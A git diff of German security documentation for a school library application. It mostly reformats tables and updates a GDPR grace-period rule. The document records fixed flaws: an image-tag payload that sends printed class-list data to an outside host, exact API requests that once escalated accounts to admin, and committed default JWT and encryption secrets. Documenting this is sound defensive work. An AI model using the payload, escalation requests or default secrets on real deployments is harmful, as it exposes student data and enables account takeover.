@@ -2,8 +2,8 @@
 
 Diese Dokumentation beschreibt die systemweiten Mechanismen zur Wahrung von Sicherheit und Datenschutz der Bibliotheks-Verwaltungssoftware.
 
-> Zuletzt aktualisiert: 2026-09-02 (PII-Stufen gemessen: GET + lesende POSTs).
-> Davor 2026-08-24 (Löschbarkeit einzelner Felder), 2026-08-06
+> Zuletzt aktualisiert: 2026-09-05 (Karenz-Uhr läuft ab dem letzten abgeschlossenen Vorgang).
+> Davor 2026-09-02 (PII-Stufen gemessen: GET + lesende POSTs), 2026-08-24 (Löschbarkeit einzelner Felder), 2026-08-06
 > (Audit-Nachlese: Cover-Proxy, SMTP-STARTTLS,
 > Lesefristen, Panic-Log, Secret-Guard-Klarstellung)
 
@@ -22,6 +22,7 @@ das Konto. Der Brute-Force-Schutz unten schützt deshalb auch den **Mailserver**
 Credential-Stuffing über diesen Weg.
 
 ### JWT (JSON Web Tokens)
+
 - **Algorithmus-Pinning:** Der Server akzeptiert ausschließlich HMAC-signierte Tokens (HS256). Die `alg=none`-Schwachstelle (CVE-Klasse) ist damit verhindert — ein Token ohne Signatur wird abgelehnt.
 - **Blacklist (fail-closed):** Abgemeldete Tokens werden in einer Datenbank-Blacklist registriert. Ist die Blacklist-Abfrage nicht erreichbar (DB-Fehler), wird der Request abgelehnt (HTTP 500), nicht durchgelassen. „Fail-Open"-Verhalten ist ausgeschlossen.
 - **Lebensdauer:** 12 Stunden; danach ist eine erneute Anmeldung erforderlich.
@@ -29,6 +30,7 @@ Credential-Stuffing über diesen Weg.
 - **Cookie-Attribute:** `HttpOnly` (kein JS-Zugriff), `SameSite=Strict`, in Produktion zusätzlich `Secure` (via `COOKIE_SECURE=true`). Hier stand bis zum 08.08.2026 `Lax` — der Code setzt seit jeher `http.SameSiteStrictMode` (`auth/handlers.go`). Die Doku war also laxer als die Anwendung; wer sie als Grundlage für eine Risikoabwägung nimmt, rechnet mit einem Cross-Site-Fenster, das es nicht gibt.
 
 ### Brute-Force-Schutz (Login)
+
 - **Schlüssel:** `lower(email)|ip` — sperrt ein Konto für eine IP-Adresse (5 Fehlversuche / 15 min).
 - **Warum nicht nur IP?** An einer Schulnetzwerk-NAT sind alle Geräte hinter einer IP. Würde nur die IP gesperrt, würde ein einziger Fehlversuch die gesamte Schule aussperren. Der Composite-Key (`email|ip`) isoliert das betroffene Konto auf dieser IP und schützt trotzdem gegen gezielte Account-Angriffe.
 - **Globaler Rate-Limiter:** Zusätzlich 50 Requests/s/IP über alle Endpunkte (Map+Mutex, kein externer Cache nötig).
@@ -42,6 +44,7 @@ Credential-Stuffing über diesen Weg.
 ## 🔒 Autorisierung (RBAC)
 
 ### RequirePermission-Middleware
+
 - Alle schützenswerten Endpunkte sind über `RequirePermission` bzw. `RequireRoles` abgesichert.
 - **Keine transiente 403-Cacheung:** Ist die Datenbank bei der Berechtigungsprüfung nicht erreichbar (Netzwerkfehler, Timeout), wird HTTP 500 zurückgegeben und **nicht** in den Permission-Cache geschrieben. Ein vorübergehender DB-Ausfall führt also nicht dazu, dass legitime Benutzer für 60 Sekunden ausgesperrt bleiben.
 - **Stabile Verweigerung:** Nur `pgx.ErrNoRows` (Berechtigung definitiv nicht vorhanden) wird gecacht und als 403 gewertet.
@@ -53,10 +56,10 @@ Credential-Stuffing über diesen Weg.
 MITARBEITER, LEHRER und HELFER an. Bis zum 06.08.2026 war es damit gleichbedeutend mit
 Administrator; drei Wege führten dahin, alle jetzt geschlossen (`api/user_admin_eskalation.go`):
 
-| Weg | Vorher | Jetzt |
-|---|---|---|
-| Selbstbeförderung | `PUT /api/benutzer/{eigene-id}` mit `rolle:"admin"` ging durch — der Selbstschutz unterstellte, wer sich selbst bearbeitet, sei bereits Admin, und ließ ausgerechnet diesen Fall zu | Die **eigene Rolle** ist für niemanden änderbar, gleich welcher Rolle |
-| Fremdbeförderung | `POST`/`PUT /api/benutzer` mit `rolle:"admin"` für ein beliebiges Konto | Die Rolle `admin` vergibt nur ein Administrator |
+| Weg                  | Vorher                                                                                                                                                                                                                                                                                    | Jetzt                                                                                          |
+| -------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------- |
+| Selbstbeförderung    | `PUT /api/benutzer/{eigene-id}` mit `rolle:"admin"` ging durch — der Selbstschutz unterstellte, wer sich selbst bearbeitet, sei bereits Admin, und ließ ausgerechnet diesen Fall zu                                                                                                       | Die **eigene Rolle** ist für niemanden änderbar, gleich welcher Rolle                          |
+| Fremdbeförderung     | `POST`/`PUT /api/benutzer` mit `rolle:"admin"` für ein beliebiges Konto                                                                                                                                                                                                                   | Die Rolle `admin` vergibt nur ein Administrator                                                |
 | Übernahme per E-Mail | Die Anmeldung prüft per IMAP und sucht den Benutzer danach über seine **E-Mail** (`auth/handlers.go`). Wer die E-Mail eines Admin-Datensatzes auf die eigene Schuladresse setzte, bekam beim nächsten Login mit den **eigenen** Zugangsdaten die Admin-Sitzung — ganz ohne Rollenänderung | Ein Konto, das **heute** Administrator ist, kann nur ein Administrator bearbeiten oder löschen |
 
 Zusätzlich ändert die **Rechte-Matrix** (`PUT /api/admin/permissions`) nur noch ein
@@ -73,6 +76,7 @@ Administratoren und die normale Kontoverwaltung unverändert funktionieren) und
 `api/user_admin_permissions_pg_test.go`.
 
 ### Rollenkonzept
+
 - `admin`: Vollzugriff (`["*"]`). Berechtigungen werden beim Login direkt aus `role_permissions` geladen.
 - `kollegium`: **Genau ein** Recht — `create_reservations` (Klassensatz im Kollegiums-Portal reservieren). Alles Weitere ist seit Migration 070 entzogen; die Suche im Portal läuft über den öffentlichen OPAC und fasst keine Personendaten an. Die Rolle hieß bis Migration 069 `lehrer`.
 - `mitarbeiter`: Grundrechte für den Tresen-Betrieb.
@@ -86,6 +90,7 @@ Administratoren und die normale Kontoverwaltung unverändert funktionieren) und
 > steuert nicht nur das Menü, sondern über `RequirePermission` auch die API.
 
 ### Endpunkte ohne Anmeldung
+
 Ein Test erzwingt die Vollständigkeit dieser Liste: `TestAlleRoutenSindGeschuetzt`
 (`api/routes_authz_coverage_test.go`) lässt jede registrierte Route ohne
 `RequirePermission`/`RequireRoles` fehlschlagen, solange sie nicht mit Begründung auf der
@@ -93,12 +98,12 @@ Allowlist steht. Eine ungeschützte Route kann also nicht unbemerkt live gehen.
 
 Bewusst öffentlich sind:
 
-| Endpunkt | Warum unbedenklich |
-|---|---|
-| `GET /api/public/opac/suche` | Katalogsuche: Titel/Autor/Verfügbarkeit, keine personenbezogenen Daten. LMF-Schulbücher sind ausgefiltert. |
-| `GET /api/monitor/slides` | Bibliotheks-Monitor, nur Buchdaten. |
-| `GET /api/images/cover`, `/uploads/` | Cover-Bilder (SSRF-Host-Allowlist). Schülerfotos liegen **nicht** hier, sondern AES-verschlüsselt in der Datenbank. Grenzen siehe unten. |
-| `GET /api/csrf-token`, `/api/auth/*`, `POST /login` | Bootstrap bzw. selbst-authentifizierend. |
+| Endpunkt                                                                                      | Warum unbedenklich                                                                                                                                                                                                                      |
+| --------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `GET /api/public/opac/suche`                                                                  | Katalogsuche: Titel/Autor/Verfügbarkeit, keine personenbezogenen Daten. LMF-Schulbücher sind ausgefiltert.                                                                                                                              |
+| `GET /api/monitor/slides`                                                                     | Bibliotheks-Monitor, nur Buchdaten.                                                                                                                                                                                                     |
+| `GET /api/images/cover`, `/uploads/`                                                          | Cover-Bilder (SSRF-Host-Allowlist). Schülerfotos liegen **nicht** hier, sondern AES-verschlüsselt in der Datenbank. Grenzen siehe unten.                                                                                                |
+| `GET /api/csrf-token`, `/api/auth/*`, `POST /login`                                           | Bootstrap bzw. selbst-authentifizierend.                                                                                                                                                                                                |
 | `GET /api/public/bestellung/{token}` + `/etiketten/{groesse}?format=…` + `POST …/bestaetigen` | Bestätigungs-Link an den Lieferanten — siehe unten. `format` wählt das Bogenraster der kleinen Etiketten und wird gegen die Allowlist in `api/label_formats.go` geprüft: Unbekanntes ergibt **400**, nicht stillschweigend die Vorgabe. |
 
 **Der Bestätigungs-Link ist der einzige schreibende Zugang ohne Anmeldung.** Sein
@@ -134,13 +139,16 @@ Zuschnitt begrenzt den Schaden:
 ## 🛡️ Schutz vor Injection-Angriffen
 
 ### SQL-Injection
+
 - Alle Datenbankinteraktionen erfolgen ausschließlich über parametrisierte Queries (`$1`, `$2`, …) mit `jackc/pgx/v5`. String-Konkatenation in SQL-Statements existiert nicht.
 
 ### CSV-Formel-Injection (CWE-1236)
+
 - **Angriffsvektor:** Buchtitel oder Autornamen, die mit `=`, `+`, `-`, `@`, `\t`, `\r`, `\n` beginnen, können in CSV-Dateien als Formeln interpretiert werden (Excel/LibreOffice führt diese bei Öffnen aus).
 - **Schutz:** `pkg/csvutil.SanitizeRow()` setzt einen Apostroph-Präfix vor alle Zellen, die mit einem dieser Zeichen beginnen (OWASP-Empfehlung). Wird bei allen CSV-Exporten verwendet (`inventur/export_csv.go`, Bestellexporte).
 
 ### XSS (Cross-Site Scripting)
+
 - Svelte 5 escaped alle Template-Variablen automatisch.
 - `{@html}` wird im gesamten Frontend nicht eingesetzt.
 - SVG-Icons sind hartcodierte Konstanten, keine benutzerkontrollierten Werte.
@@ -154,11 +162,11 @@ Bis zum 06.08.2026 gingen `schueler_name`, `schueler_nachname`, `klasse`,
 
 Gemessen (Chromium, mit dem echten CSP-String) sah das so aus:
 
-| Nutzlast im Nachnamen | Ergebnis |
-|---|---|
-| `<script>…</script>` | **blockiert** — ein per `window.open('')` erzeugtes `about:blank` erbt die CSP des Openers, und die erlaubt nur `script-src 'self'` |
-| `onerror="…"` | **blockiert**, gleicher Grund |
-| `<img src="https://fremder-host/?daten=…">` | **geladen** — `img-src` erlaubte ausdrücklich `https:` |
+| Nutzlast im Nachnamen                       | Ergebnis                                                                                                                            |
+| ------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------- |
+| `<script>…</script>`                        | **blockiert** — ein per `window.open('')` erzeugtes `about:blank` erbt die CSP des Openers, und die erlaubt nur `script-src 'self'` |
+| `onerror="…"`                               | **blockiert**, gleicher Grund                                                                                                       |
+| `<img src="https://fremder-host/?daten=…">` | **geladen** — `img-src` erlaubte ausdrücklich `https:`                                                                              |
 
 Der Befund war also keine Skriptausführung, sondern HTML-Injektion mit Abflusskanal:
 Der Inhalt der gedruckten Klassenliste ließ sich an einen fremden Server tragen.
@@ -178,12 +186,14 @@ dass er an jeder Einsetzstelle aufgerufen wird.
 ## 📁 Datei-Uploads
 
 ### Foto-Uploads (Schülerfotos)
+
 - **Decompression-Bomb-Schutz:** `pkg/imageutil.GuardImageDimensions()` liest per `image.DecodeConfig` nur den Bild-Header (ohne volle Dekodierung). Bilder über 50 Megapixel werden abgelehnt, bevor `image.Decode` die vollständige Pixelmatrix allokiert (Schutz gegen RAM-Erschöpfung durch präparierte Bilder).
 - **MIME-Prüfung:** Über echte Dekodierung, nicht nur Dateiendung.
 - **Verschlüsselung:** Fotos werden AES-256-GCM-verschlüsselt als `BYTEA` in der Datenbank gespeichert — kein Klarpfad auf dem Dateisystem.
 - **Path-Traversal:** Alle Pfadoperationen nutzen `filepath.Base` + `filepath.Clean` + Prefix-Guard.
 
 ### Cover-Uploads
+
 - 10 MB Body-Limit, 0600 Dateiberechtigungen.
 - Ebenfalls `GuardImageDimensions` vor dem vollständigen Decode.
 - **Pfadbindung über `os.OpenRoot`** (seit 06.08.2026, `inventur/uploads_pfad.go`). Vorher
@@ -195,18 +205,19 @@ dass er an jeder Einsetzstelle aufgerufen wird.
   Symlink-Test **rot**, mit `os.OpenRoot` grün, weil die Auflösung am Kernel scheitert.
 
 ### Cover-Proxy (`GET /api/images/cover`) — der teuerste öffentliche Pfad
+
 Dieser Endpunkt ist der einzige **unauthentifizierte** Pfad, der eine ausgehende
 Verbindung und eine vollständige Bilddekodierung auslöst: ein Aufruf = ein fremder
 Download + ein `image.Decode`. Bis zum 06.08.2026 war daran nichts begrenzt — er steht
 zusätzlich in der Ausnahmeliste des globalen Rate-Limiters, weil ein Katalogaufruf
 dutzende Bilder gleichzeitig lädt. Jetzt gilt:
 
-| Grenze | Wert | Wogegen |
-|---|---|---|
-| Cache-Name (`?isbn=`) | nur Ziffern, Trennstriche, abschließendes `X` | Er wird zum Dateinamen; beliebige Zeichenketten legten beliebige Dateien an |
-| Antwortgröße | 10 MB (`io.LimitReader`) | Der fremde Server bestimmte, wie viel RAM ein Aufruf kostet |
-| Bildgröße | 50 MP (`GuardImageDimensions`, nur Header) | Decompression-Bomb: 30000×30000 px ≈ 3,6 GB im Speicher, wenige hundert KB auf der Leitung |
-| Downloads/IP | 30/s — **nur der Cache-Fehltreffer** | Verstärkung: eine Anfrage von außen = eine ausgehende Anfrage von uns |
+| Grenze                | Wert                                          | Wogegen                                                                                    |
+| --------------------- | --------------------------------------------- | ------------------------------------------------------------------------------------------ |
+| Cache-Name (`?isbn=`) | nur Ziffern, Trennstriche, abschließendes `X` | Er wird zum Dateinamen; beliebige Zeichenketten legten beliebige Dateien an                |
+| Antwortgröße          | 10 MB (`io.LimitReader`)                      | Der fremde Server bestimmte, wie viel RAM ein Aufruf kostet                                |
+| Bildgröße             | 50 MP (`GuardImageDimensions`, nur Header)    | Decompression-Bomb: 30000×30000 px ≈ 3,6 GB im Speicher, wenige hundert KB auf der Leitung |
+| Downloads/IP          | 30/s — **nur der Cache-Fehltreffer**          | Verstärkung: eine Anfrage von außen = eine ausgehende Anfrage von uns                      |
 
 Ausgelieferte Cache-Treffer bleiben ungebremst; sie sind ein Datei-Read. Wichtig zum
 Verständnis der Allowlist: `covers.openlibrary.org` steht darauf und wird von
@@ -223,6 +234,7 @@ auf der Leitung, aber keines für den Speicher.
 ## 📧 E-Mail-Sicherheit (SMTP/IMAP)
 
 ### SMTP STARTTLS
+
 - **STARTTLS ist Pflicht** (`mailservice.sichereVerbindung`, 06.08.2026): Bietet der Server
   die Erweiterung nicht an, bricht der Versand mit `ErrSMTPKlartext` ab, statt die Nachricht
   im Klartext zu schicken. Vorher hieß die Funktion `starttlsWennMoeglich` und gab in genau
@@ -244,6 +256,7 @@ auf der Leitung, aber keines für den Speicher.
 - **Header-Injection:** Attachment-Dateinamen werden gegen CRLF-Injection bereinigt.
 
 ### IMAP
+
 - Implizites TLS (Port 993), `MinVersion: TLS 1.2`, ServerName-Verifikation, Timeouts.
 
 ---
@@ -258,10 +271,13 @@ auf der Leitung, aber keines für den Speicher.
 ## 🐳 Produktions-Absicherung (Secret Guard)
 
 ### Problem
+
 Wenn `JWT_SECRET` oder `APP_ENCRYPTION_KEY` die committeten Entwicklungs-Defaults verwenden, kann jeder mit Repo-Zugriff Admin-JWTs fälschen (vollständige Übernahme) oder AES-verschlüsselte Schülerfotos entschlüsseln.
 
 ### Lösung (`main.go/loadConfig`)
+
 Der Server **verweigert den Start**, wenn der Schalter `ENFORCE_PROD_SECRETS=true` gesetzt ist und bekannte Default-Secrets erkannt werden:
+
 ```go
 enforceProdSecrets := strings.ToLower(os.Getenv("ENFORCE_PROD_SECRETS")) == "true"
 if enforceProdSecrets {
@@ -275,25 +291,27 @@ if enforceProdSecrets {
 ```
 
 **Bewusst per Schalter einschaltbar (entkoppelt von `APP_ENV`):**
+
 - Test-/Pilotphase: `ENFORCE_PROD_SECRETS=false` (Standard) → Stack startet auch mit Defaults.
 - Echter Prod-Deploy: `ENFORCE_PROD_SECRETS=true` → harte Start-Verweigerung bei Default-Secrets.
 
 Die Entkopplung von `APP_ENV` ist Absicht: `APP_ENV=local` würde sonst gleichzeitig das Cookie-`Secure`-Flag deaktivieren und Swagger öffentlich freischalten. So bleibt `APP_ENV=production` (sichere Cookies, kein Swagger), während die Secret-Härtung separat geschaltet wird.
 
 ### Mindestanforderungen
+
 - `JWT_SECRET`: ≥ 32 Zeichen
 - `APP_ENCRYPTION_KEY`: genau 32 Bytes (oder 64 Hex-Zeichen)
 
 **Was `docker-compose.yml` erzwingt — und was nicht.** Hier stand bis zum 06.08.2026,
-die Compose-Datei erzwinge per `${VAR:?Fehlermeldung}`, dass *alle* Secrets gesetzt sind.
+die Compose-Datei erzwinge per `${VAR:?Fehlermeldung}`, dass _alle_ Secrets gesetzt sind.
 Das stimmt nur für zwei davon. Tatsächlich:
 
-| Variable | Compose-Verhalten |
-|---|---|
-| `POSTGRES_PASSWORD` | `${…:?}` — Stack startet ohne sie **nicht** |
-| `IMAP_HOST` | `${…:?}` — Stack startet ohne sie **nicht** |
-| `JWT_SECRET` | `${…:-super-secret-default-key-at-least-32-bytes}` — fällt auf den **committeten Default** zurück |
-| `APP_ENCRYPTION_KEY` | `${…:-super-secure-aes-key-32-chars-ok}` — fällt auf den **committeten Default** zurück |
+| Variable             | Compose-Verhalten                                                                                 |
+| -------------------- | ------------------------------------------------------------------------------------------------- |
+| `POSTGRES_PASSWORD`  | `${…:?}` — Stack startet ohne sie **nicht**                                                       |
+| `IMAP_HOST`          | `${…:?}` — Stack startet ohne sie **nicht**                                                       |
+| `JWT_SECRET`         | `${…:-super-secret-default-key-at-least-32-bytes}` — fällt auf den **committeten Default** zurück |
+| `APP_ENCRYPTION_KEY` | `${…:-super-secure-aes-key-32-chars-ok}` — fällt auf den **committeten Default** zurück           |
 
 Für die beiden letzten ist der Code-Guard (`ENFORCE_PROD_SECRETS=true`) die **einzige**
 Absicherung, und er ist standardmäßig **aus**. Ein Prod-Deploy ohne gesetzte `.env`-Werte
@@ -313,14 +331,16 @@ Schülerfotos entschlüsselbar.
 ## 🔒 Datenschutz und DSGVO-Konformität
 
 ### Automatisierte Löschroutinen
+
 Die Applikation führt automatisierte Cronjobs (`jobs/cron.go`) durch:
 
 - **Ausleihen-Anonymisierung (`RunGDPRAnonymizeLoans`):** Entfernt `bearbeiter_id` von Ausleihen, die vor mehr als 14 Tagen zurückgegeben wurden.
 - **Abgänger-Löschung (`RunGDPRDeleteAbgaenger`):** Hard-Delete von Schülerdatensätzen (`ist_abgaenger = true`) am Stichtag 30. Januar des Folgejahres (`AbgaengerStichjahr`; nicht zu verwechseln mit der Karenzzeit vor der Anonymisierung, s. u.), sofern keine offenen Ausleihen oder unbezahlten Schadensfälle bestehen. Historische Ausleihdaten werden anonymisiert (`schueler_id = NULL`).
 - **Lesehistorie befristen (`RunLesehistorieBefristung`, seit 22.08.2026):** Trennt abgeschlossene Ausleihen nach Frist vom Schüler (`schueler_id = NULL`); der Vorgang bleibt für Statistik und Bestandskartei erhalten, nur ohne Person. Zwei Fristen, weil zwei Verarbeitungstätigkeiten (Einstellungen → „Datenschutz & Sitzung", 0 = aus): **Schülerbücherei 90 Tage** (HBDI-Muster-VVT: löschen, „sobald nicht mehr notwendig"), **Lernmittel 730 Tage** (Bestandskartei weist Ausleihe **und** Rücklauf nach, HKM-Leitfaden LMF 11.3; Schadensersatz läuft über die Schulaufsicht, 12.3–12.7). Ausleihen mit **offenem Schadensfall** bleiben zugeordnet, Lehrer-Ausleihen (dienstlich) unberührt. Gate: `jobs/cron_dsgvo_lesehistorie_pg_test.go` (Paarung Frist × Medienklasse, Schadensfall-Wächter, Aus-Schalter — am Rückbau rot gesehen). Vorher behielt jede Ausleihe ihre `schueler_id` bis zur Schüler-Löschung; die Titel-Historie zeigte bis zu 200 Entleiher mit Namen.
-- **Anonymisierung alter Datensätze (`RunGDPRAnonymizeOldData`):** Leert nach Frist (Soft-Delete > 180 Tage; Abgänger nach der einstellbaren **Karenzzeit** `abgaenger_karenz_tage`, Vorgabe 90 Tage ab `abgaenger_seit` — bis 02.09.2026 fest 360 Tage) alle direkt identifizierenden Spalten eines Schülers (Name, Adresse, Geburtsdatum, Schuleintritt, LUSD-ID, Eltern-E-Mail), löscht das verschlüsselte Foto — und tilgt die PII-Spuren aus den **Neben-Tabellen**: den Klarnamen aus `audit_log`, die LUSD-ID aus `audit_logs`, und die Vormerkungen des Schülers. Ohne diese Tilgung überlebte der Personenbezug bis zur Audit-Aufbewahrung (bis zu 24 Monate) nach der eigentlichen Löschung.
+- **Anonymisierung alter Datensätze (`RunGDPRAnonymizeOldData`):** Leert nach Frist (Soft-Delete > 180 Tage; Abgänger nach der einstellbaren **Karenzzeit** `abgaenger_karenz_tage`, Vorgabe 90 Tage ab dem spätesten von Abgang `abgaenger_seit`, letzter Rückgabe und letztem Schadensabschluss — bis 02.09.2026 fest 360 Tage, bis 05.09.2026 nur ab dem Abgang) alle direkt identifizierenden Spalten eines Schülers (Name, Adresse, Geburtsdatum, Schuleintritt, LUSD-ID, Eltern-E-Mail), löscht das verschlüsselte Foto — und tilgt die PII-Spuren aus den **Neben-Tabellen**: den Klarnamen aus `audit_log`, die LUSD-ID aus `audit_logs`, und die Vormerkungen des Schülers. Ohne diese Tilgung überlebte der Personenbezug bis zur Audit-Aufbewahrung (bis zu 24 Monate) nach der eigentlichen Löschung.
 
 ### Datenverschlüsselung
+
 - Schülerfotos: AES-256-GCM-verschlüsselt als `BYTEA` in der Datenbank. Kein Klartext auf dem Dateisystem.
 - DB-Backups: `pg_dump → gzip → AES-256-GCM`. Der Schlüssel wird per **scrypt** (speicherhart, 16-Byte-Salt pro Datei) aus `BACKUP_ENCRYPTION_KEY` abgeleitet — nicht mehr per einfachem SHA-256; das nimmt einer erbeuteten Backup-Datei die Offline-Rate-Geschwindigkeit. Versioniertes Format (`BKDF`-Kennung); der frühere schwache SHA-256-Weg ist ganz entfernt, Dateien ohne die Kennung werden abgelehnt (im Pilotbetrieb keine schützenswerten Altbackups). 0600 Dateiberechtigungen, Rotation. Seit dem 23.08.2026 gilt das für **alle drei** Backup-Wege: Auch `scripts/backup.sh` und die Vorab-Sicherung von `./update.sh` verschlüsseln über dieselbe Ableitung (`internal/backupkrypto`, Werkzeug `cmd/encrypt-backup` im Container — der Schlüssel verlässt ihn nicht). Klartext-Dumps entstehen nur noch als benannter Ausnahmefall (fehlgeschlagener Deploy = Rollback-Weg, Verschlüsselung nicht möglich) und werden nach 2 statt 30 Tagen gelöscht.
 
@@ -460,13 +480,13 @@ des LUSD-Abgleichs unlöschbar).
 Rechtsgrundlagen** (Entwurf nach HBDI-Muster in
 [datenschutz/vvt_entwurf.md](datenschutz/vvt_entwurf.md)):
 
-| | (1) Lernmittelausleihe | (2) Schülerbücherei |
-|---|---|---|
+|                     | (1) Lernmittelausleihe                                                                                                                                                                         | (2) Schülerbücherei                                                                                                                                         |
+| ------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------- |
 | **Rechtsgrundlage** | Art. 6 Abs. 1 lit. e DSGVO i. V. m. § 83 HSchG (Datenverarbeitung durch Schulen) und § 153 HSchG / Verordnung zur Lernmittelfreiheit — öffentlich-rechtliches Nutzungsverhältnis, kein Vertrag | Einwilligung Art. 6 Abs. 1 lit. a DSGVO (freiwillige Nutzung; so das HBDI-Muster-VVT „Schulbibliothek"); für Minderjährige durch die Erziehungsberechtigten |
-| **Zweck** | Nachweis von Ausleihe und Rücklauf (Bestandskartei, HKM-Leitfaden 11.3), Mahnung, Schadensersatz (12.3–12.7, Leistungsbescheid über die Schulaufsicht) | Ausleihverwaltung, Rückgabeerinnerung, Vormerkung |
-| **Anschrift** | gedruckte Rechnung / Elternbrief | gedruckter Elternbrief bei Mahnung |
-| **Eltern-E-Mail** | `mailto:`-Link für manuelle Kontaktaufnahme; kein Versand durch das System | dito |
-| **Löschung** | Abgänger-Routine (unten) + Lesehistorie-Trennung nach 730 Tagen | Abgänger-Routine + Lesehistorie-Trennung nach 90 Tagen |
+| **Zweck**           | Nachweis von Ausleihe und Rücklauf (Bestandskartei, HKM-Leitfaden 11.3), Mahnung, Schadensersatz (12.3–12.7, Leistungsbescheid über die Schulaufsicht)                                         | Ausleihverwaltung, Rückgabeerinnerung, Vormerkung                                                                                                           |
+| **Anschrift**       | gedruckte Rechnung / Elternbrief                                                                                                                                                               | gedruckter Elternbrief bei Mahnung                                                                                                                          |
+| **Eltern-E-Mail**   | `mailto:`-Link für manuelle Kontaktaufnahme; kein Versand durch das System                                                                                                                     | dito                                                                                                                                                        |
+| **Löschung**        | Abgänger-Routine (unten) + Lesehistorie-Trennung nach 730 Tagen                                                                                                                                | Abgänger-Routine + Lesehistorie-Trennung nach 90 Tagen                                                                                                      |
 
 Bis zum 22.08.2026 stand hier „Art. 6 Abs. 1 lit. c i. V. m. lit. b" — lit. b
 (Vertrag) passt auf keine der beiden Tätigkeiten, lit. c (rechtliche Verpflichtung)
@@ -489,13 +509,13 @@ nur `ReadHeaderTimeout` — die **Kopfzeilen** waren begrenzt, der **Rumpf** nic
 beliebig lange verbunden. Die `TimeoutMiddleware` half dagegen nicht: Ein
 Kontext-Deadline bricht kein blockierendes `Read` auf der Verbindung ab.
 
-| Frist | Wert | Gilt für |
-|---|---|---|
-| `ReadHeaderTimeout` | 5 s | Kopfzeilen |
-| `ReadTimeout` (`api.StandardLesefrist`) | 30 s | Kopf **und** Rumpf, alle gewöhnlichen Endpunkte |
-| Lesefrist der Import-Pfade | 5 min (`LangLaufendeFrist`) | `ErweitereLesefristFuerLangeUploads`, dieselbe Pfadliste wie die Bearbeitungsfrist |
-| `IdleTimeout` | 120 s | Zwischen zwei Anfragen einer Keep-Alive-Verbindung |
-| `WriteTimeout` | **bewusst nicht gesetzt** | Es gälte für die ganze Antwort — und `/events` (SSE) ist definitionsgemäß eine Antwort, die nie endet |
+| Frist                                   | Wert                        | Gilt für                                                                                              |
+| --------------------------------------- | --------------------------- | ----------------------------------------------------------------------------------------------------- |
+| `ReadHeaderTimeout`                     | 5 s                         | Kopfzeilen                                                                                            |
+| `ReadTimeout` (`api.StandardLesefrist`) | 30 s                        | Kopf **und** Rumpf, alle gewöhnlichen Endpunkte                                                       |
+| Lesefrist der Import-Pfade              | 5 min (`LangLaufendeFrist`) | `ErweitereLesefristFuerLangeUploads`, dieselbe Pfadliste wie die Bearbeitungsfrist                    |
+| `IdleTimeout`                           | 120 s                       | Zwischen zwei Anfragen einer Keep-Alive-Verbindung                                                    |
+| `WriteTimeout`                          | **bewusst nicht gesetzt**   | Es gälte für die ganze Antwort — und `/events` (SSE) ist definitionsgemäß eine Antwort, die nie endet |
 
 Die Schreibrichtung begrenzt stattdessen Caddy (`write_timeout 600s`) und für die
 Bearbeitungsdauer die `TimeoutMiddleware`. Beide Richtungen der Lesefrist sind belegt
@@ -510,6 +530,7 @@ Frist gesetzt wurde.
 ## 🛡️ Netzwerksicherheit & Security-Header
 
 Restriktive HTTP-Header in `internal/middleware/security.go`:
+
 - `frame-ancestors 'none'` — verhindert Clickjacking via iFrame
 - `form-action 'self'` — Formulare nur an eigene API
 - `script-src 'self'` — kein externes Script-Loading
@@ -557,12 +578,12 @@ verzählt.
 auf `main`, zusätzlich **montags 07:00 UTC** (frisch veröffentlichte CVEs treffen auch
 Code, der sich nicht geändert hat) und auf Knopfdruck:
 
-| Prüfung | Sieht | Blinder Fleck |
-|---|---|---|
-| `govulncheck` | Bekannte CVEs in Go-Abhängigkeiten, **aufrufbezogen** (meldet nur, was tatsächlich erreicht wird) | Eigener Code |
-| `gosec` | Muster im Go-Quelltext (SAST), Ausschlussliste im Workflow | Zusammenhänge über Funktionsgrenzen |
-| `npm audit` | CVEs in Frontend-Abhängigkeiten (`--audit-level=high --omit=dev`) | Eigener Code |
-| `trivy` + Container-Smoke | Das gebaute Image; dazu: läuft es unprivilegiert, sind die per `exec.Command` gerufenen Werkzeuge da (`pg_dump`), ist jedes Volume-Ziel für `appuser` beschreibbar | Anwendungslogik |
+| Prüfung                   | Sieht                                                                                                                                                              | Blinder Fleck                       |
+| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------- |
+| `govulncheck`             | Bekannte CVEs in Go-Abhängigkeiten, **aufrufbezogen** (meldet nur, was tatsächlich erreicht wird)                                                                  | Eigener Code                        |
+| `gosec`                   | Muster im Go-Quelltext (SAST), Ausschlussliste im Workflow                                                                                                         | Zusammenhänge über Funktionsgrenzen |
+| `npm audit`               | CVEs in Frontend-Abhängigkeiten (`--audit-level=high --omit=dev`)                                                                                                  | Eigener Code                        |
+| `trivy` + Container-Smoke | Das gebaute Image; dazu: läuft es unprivilegiert, sind die per `exec.Command` gerufenen Werkzeuge da (`pg_dump`), ist jedes Volume-Ziel für `appuser` beschreibbar | Anwendungslogik                     |
 
 **CodeQL läuft daneben, ohne Datei im Repository.** Für dieses Repository ist GitHubs
 **Standard-Setup** aktiv (Settings → Code security → Code scanning). Es analysiert `go`,
